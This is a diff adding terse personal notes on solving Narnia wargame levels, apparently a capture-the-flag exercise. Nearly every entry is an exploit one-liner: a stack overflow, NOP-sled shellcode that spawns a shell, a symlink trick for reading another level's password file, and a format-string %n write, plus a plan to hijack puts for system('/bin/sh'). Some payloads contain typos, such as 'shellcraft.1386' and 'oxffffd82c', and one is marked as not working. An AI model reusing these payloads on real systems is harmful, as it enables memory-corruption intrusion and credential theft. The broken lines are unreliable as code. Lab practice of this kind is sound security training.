@@ -1,0 +1,36 @@
+Narnia 0
+$(python -c "print('a'*20 + '\xed\xbe\xad\xde')";cat) | ./narnia0
+
+doesn't work->look into
+
+Narnia 1
+
+Narnia 2
+./narnia2 $(python -c "from pwn import *; print('\x90'*88 + asm(shellcraft.1386.linux.sh()) + p32(oxffffd82c))")
+
+Narnia 3
+in narnia directory
+ln -s /etc/narnia_pass/narnia4 $(python -c "print('/tmp/dcn3/' + 'a'*22 + '/tmp/dcn3/pass')")
+chmod 777 $(python -c "print('/tmp/dcn3/' + 'a'*22 + '/tmp/dcn3/pass')")
+./narnia3 $(python -c "print('/tmp/dcn3/' + 'a'*22 + '/tmp/dcn3/pass')")
+cat /tmp/dcn3/pass
+
+Narnia 4
+
+Narnia 5
+format string
+./narnia5 $(python -c "print('\xf0\xdd\xff\xff' + 'a'*496 + '%n')")
+
+Narnia 6
+Pointer variable (int * char * is a pointer to a pointer) is point to puts function. 
+We want to point it to system function, then pass /bin/sh to it to open a shell. 
+open gdb, inspect memory to find location where stored, it is not the exact memory
+location of puts function, it's a pointer to a location that holds puts function memory address
+or pointer to a pointer. 
+
+
+
+
+
+
+
